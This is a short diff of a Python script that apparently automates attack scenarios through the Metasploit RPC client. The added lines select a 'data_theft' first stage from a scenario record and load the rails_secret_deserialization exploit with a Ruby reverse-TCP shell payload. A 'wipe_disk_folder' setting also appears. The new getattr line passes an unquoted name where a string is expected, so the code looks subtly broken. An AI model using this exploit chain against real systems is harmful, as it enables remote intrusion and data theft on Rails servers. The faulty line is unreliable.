@@ -20,7 +20,9 @@ def main(argv):
     wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
-
+    AS = AttackScenario.objects().all().first()
+    FS = getattr(AS, data_theft_FirstStage)
+    # choose which exploit to use
     if(FS == "rails_secret_deserialization"):
         exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
         payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
